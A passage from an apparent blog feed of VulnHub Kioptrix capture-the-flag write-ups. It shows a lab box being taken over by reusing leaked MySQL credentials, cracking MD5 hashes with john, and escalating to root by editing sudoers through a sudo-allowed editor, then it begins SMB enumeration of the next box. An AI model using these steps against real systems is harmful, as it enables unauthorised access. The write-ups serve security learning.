&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 23126 Jun  5  2009 favicon.ico
drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   399 Feb 23  2011 index.php
drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
drwxrwxrwx  3 root root  4096 Apr 14  2011 style
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   243 Aug  5  2010 update.php
www-data@Kioptrix3:/home/www/kioptrix3.com&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These are all interesting… looking through them all led me to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gallery/gconfig.php&lt;/code&gt;, which contains:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;nv&quot;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gallarific_mysql_server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gallarific_mysql_database&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;gallery&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gallarific_mysql_username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gallarific_mysql_password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;fuckeyou&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool. Let’s truy logging into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/phpmyadmin/&lt;/code&gt; with these.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_10.PNG&quot; alt=&quot;Logging into PHP admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Easy enough. After this I looked around through the SQL tables for a while, and eventually found some hashed user passwords in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev_accounts&lt;/code&gt; table in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gallery&lt;/code&gt; database:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	Full Texts 	&lt;span class=&quot;nb&quot;&gt;id 	&lt;/span&gt;username 	password
	Edit 	Delete 	1 	dreg 		0d3eccfb887aabd50f243b3f155c0f85
	Edit 	Delete 	2 	loneferret 	5badcaf789d3d1d09794d8f021f40f0e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s pipe these over to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; and try to crack them:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.2:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/sbin/john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RAW-MD5 passwords
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw-MD5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD5 256/256 AVX2 8x3]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
fopen: rockyou.txt: No such file or directory
ein@~/VulnHub/Kioptrix1.2:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/sbin/john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RAW-MD5 passwords
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw-MD5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD5 256/256 AVX2 8x3]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
starwars         &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Mast3r           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
2g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2020-07-29 01:31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.380g/s 12897Kp/s 12897Kc/s 12898KC/s Maswhit002..MashPt34
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show --format=Raw-MD5&quot;&lt;/span&gt; options to display all of the cracked passwords reliably
Session completed
ein@~/VulnHub/Kioptrix1.2:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;passwords 
0d3eccfb887aabd50f243b3f155c0f85
5badcaf789d3d1d09794d8f021f40f0e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice! so we got the cleartext password for both users. I’ll start by trying to SSH as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loneferret&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.2:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh loneferret@kio3
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'kio3 (10.0.0.204)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '&lt;/span&gt;kio3,10.0.0.204&lt;span class=&quot;s1&quot;&gt;' (RSA) to the list of known hosts.
loneferret@kio3'&lt;/span&gt;s password: 
Permission denied, please try again.
loneferret@kio3&lt;span class=&quot;s1&quot;&gt;'s password: 
Permission denied, please try again.
loneferret@kio3'&lt;/span&gt;s password: 
Linux Kioptrix3 2.6.24-24-server &lt;span class=&quot;c&quot;&gt;#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686&lt;/span&gt;

The programs included with the Ubuntu system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice. Now let’s see if we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ht&lt;/code&gt; (mentioned in the CompanyPolicy.README file we found earlier) as sudo by checking via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;loneferret@Kioptrix3:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
User loneferret may run the following commands on this host:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/usr/bin/su
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/bin/ht
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Perfect, let’s make sure our terminal is set correctly:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;loneferret@Kioptrix3:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ht&lt;/code&gt; text editor as root! The method I used to privesc is to edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file and give us further permission. In this case I’ll simply give us full rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/su&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_11.PNG&quot; alt=&quot;Editing `/etc/sudoers/`&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we can simply switch users to root:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;loneferret@Kioptrix3:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
root@Kioptrix3:/home/loneferret# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice! rooted. Let’s look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/Congrats.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Kioptrix3:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Congrats.txt 
Good &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;getting here.
Regardless of the matter &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staying within the spirit of the game of course&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
you got here, congratulations are &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;order. Wasn&lt;span class=&quot;s1&quot;&gt;'t that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we’re done.&lt;/p&gt;</content><author><name>Ash</name></author><category term="VulnHub" /><category term="VulnHub" /><category term="LotusCMS" /><category term="Metasploit" /><category term="phpMyAdmin" /><category term="John" /><category term="MD5" /><category term="sudo" /><summary type="html">Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience with reusing credentials, attacking common web applications, and cracking hashed passwords. We start by exploiting LotusCMS to get a shell as www-data. From there, we find MySQL credentials that we use to login to phpMyAdmin and dump hashed user passwords. Finally, after cracking and logging in using these credentials, we exploit a sudo misconfiguration that allows us to privilege escalate using the ht text editor.</summary></entry><entry><title type="html">Kioptrix Level 1.3 (#4) Writeup - VulnHub</title><link href="http://localhost:4000/Kioptrix-Level-1.3/" rel="alternate" type="text/html" title="Kioptrix Level 1.3 (#4) Writeup - VulnHub" /><published>2020-07-29T00:00:00-04:00</published><updated>2020-07-29T00:00:00-04:00</updated><id>http://localhost:4000/Kioptrix-Level-1.3</id><content type="html" xml:base="http://localhost:4000/Kioptrix-Level-1.3/">&lt;p&gt;Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials.&lt;/p&gt;

&lt;p&gt;Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability.&lt;/p&gt;

&lt;p&gt;We use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials.&lt;/p&gt;

&lt;p&gt;MySQL is running as root and we are able to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_exec&lt;/code&gt; to set the setuid bit on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;. From here we can simply execute the binary and receieve a root shell.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;As always, we’ll start with NMAP scans:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.3:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sSV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; kioptrix1.3 10.0.0.151
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-07-29 19:49 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.151
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000057s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp  open  http        Apache httpd 2.2.8 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 08:00:27:D6:E7:AD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerating-smb&quot;&gt;Enumerating SMB&lt;/h3&gt;

&lt;p&gt;Let’s go in reverse order here by hitting ports high-to-low. We’ll start with SMB using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enum4linux&lt;/code&gt; (I’ve redacted useless output):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;enum4linux 10.0.0.151
Starting enum4linux v0.8.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on Wed Jul 29 23:14:43 2020

 &lt;span class=&quot;o&quot;&gt;==========================&lt;/span&gt; 
|    Target Information    |
 &lt;span class=&quot;o&quot;&gt;==========================&lt;/span&gt; 
Target ........... 10.0.0.151
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
Password ......... &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 &lt;span class=&quot;o&quot;&gt;==================================================&lt;/span&gt; 
|    Enumerating Workgroup/Domain on 10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;==================================================&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got domain/workgroup name: WORKGROUP

 &lt;span class=&quot;o&quot;&gt;==========================================&lt;/span&gt; 
|    Nbtstat Information &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;==========================================&lt;/span&gt; 
Looking up status of 10.0.0.151
        KIOPTRIX4       &amp;lt;00&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Workstation Service
        KIOPTRIX4       &amp;lt;03&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Messenger Service
        KIOPTRIX4       &amp;lt;20&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  File Server Service
        WORKGROUP       &amp;lt;1e&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Browser Service Elections
        WORKGROUP       &amp;lt;00&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain/Workgroup Name

        MAC Address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 00-00-00-00-00-00

 &lt;span class=&quot;o&quot;&gt;===================================&lt;/span&gt; 
|    Session Check on 10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;===================================&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Server 10.0.0.151 allows sessions using username &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;

 &lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt; 
|    OS information on 10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt; 
Use of uninitialized value &lt;span class=&quot;nv&quot;&gt;$os_info&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;concatenation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 464.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got OS info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.151 from smbclient: 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got OS info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.151 from srvinfo:
        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        platform_id     :       500
        os version      :       4.9
        server &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;     :       0x809a03

 &lt;span class=&quot;o&quot;&gt;===========================&lt;/span&gt; 
|    Users on 10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;===========================&lt;/span&gt; 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   Name: nobody    Desc: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   Name: ,,,       Desc: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     Name: root      Desc: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     Name: ,,,       Desc: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret       Name: loneferret,,,     Desc: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 &lt;span class=&quot;o&quot;&gt;=======================================&lt;/span&gt; 
|    Share Enumeration on 10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;=======================================&lt;/span&gt; 

        Sharename       Type      Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Printer Drivers
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Kioptrix4 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
Reconnecting with SMB1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;workgroup listing.

        Server               Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;

        Workgroup            Master
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        WORKGROUP            DESKTOP-PI36PQ0

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Attempting to map shares on 10.0.0.151
//10.0.0.151/print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;    Mapping: DENIED, Listing: N/A
//10.0.0.151/IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] Can&lt;span class=&quot;s1&quot;&gt;'t understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*

 ================================================== 
|    Password Policy Information for 10.0.0.151    |
 ================================================== 


[+] Attaching to 10.0.0.151 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] KIOPTRIX4
        [+] Builtin

 ===================================================================== 
|    Users on 10.0.0.151 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
...
...
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

enum4linux complete on Wed Jul 29 23:14:53 2020

ein@~:$ 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There’s lots to unpack here, but mainly let’s note that there are some usernames we detected on the box:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;S-1-22-1-1000 Unix User&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;oneferret &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local User&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
S-1-22-1-1001 Unix User&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ohn &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local User&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
S-1-22-1-1002 Unix User&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;obert &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local User&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And some shares which we don’t have access to:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;=======================================&lt;/span&gt; 
|    Share Enumeration on 10.0.0.151    |
 &lt;span class=&quot;o&quot;&gt;=======================================&lt;/span&gt; 

        Sharename       Type      Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
